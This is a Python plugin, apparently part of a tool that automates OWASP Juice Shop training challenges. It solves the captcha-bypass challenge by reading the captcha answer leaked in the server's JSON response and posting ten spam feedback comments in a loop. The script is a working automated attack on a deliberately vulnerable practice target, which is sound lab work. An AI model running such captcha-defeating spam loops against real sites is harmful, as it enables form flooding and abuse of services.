# SOURCE FILE:    test_captcha_bypass.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Doing captcha bypass challenge
#                 Insert 10 junk comments within 1 second
#                  
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Hugh Song
#
# NOTES
#--------------------------------------------------------------------------------------
import time
from plugins import attack as a

#---------------------------------------------------------------------------------------
#Class: test_captcha_bypass
#Inherit: Attack
#-----------------------------------------------------------------------------------------------
class test_captcha_bypass(a.attack_inter):
#-----------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables(REST session; getUrl; postUrl).
#-----------------------------------------------------------------------------------------------
    def __init__(self):
        self.juice_session = a.requests.session()
        self.getUrl = a.URL + '/rest/captcha/'
        self.postUrl = a.URL + '/api/Feedbacks/'

#-----------------------------------------
#FUNCTION generator
#ARGUMENTS: myScript --> (answer, captchaId) pair to pass math question verification
#RETURNS: data  --> will be embedded into POST request json field. 
#Description: This function is used to generate needed data from REST requests
#             
#NOTES:
# ALL REST requests needed data like json_data, header, and cookie must generated through this function
#-----------------------------------------------------------------------------------------------
    def generator(self, myScript):
        data = {
            'captcha': myScript[0],
            'captchaId' : myScript[1],
            'comment': 'hehehe (anonymous)',
            'rating' : 2
        }
        return data

#-----------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This is the main function for plugin to send REST requests.
#             1. send GET request to getUrl
#             2. extract math question answer and captchaId from respond
#             3. Loop to send crafted POST requests 10 times. 
#             
#NOTES: None
#-----------------------------------------------------------------------------------------------
    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', 
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        logger = a.logging.getLogger("Captcha Bypass")
        a.logging.info(logger)
        a.logging.info('Started')
        for i in range(0,10):
            response = self.juice_session.get(self.getUrl)
            token = [0,0]
            token[0] = response.json()["answer"]
            token[1] = response.json()["captchaId"]
            mydata = self.generator(token)
            response = self.juice_session.post(self.postUrl, data=mydata)
        a.logging.info('Finished')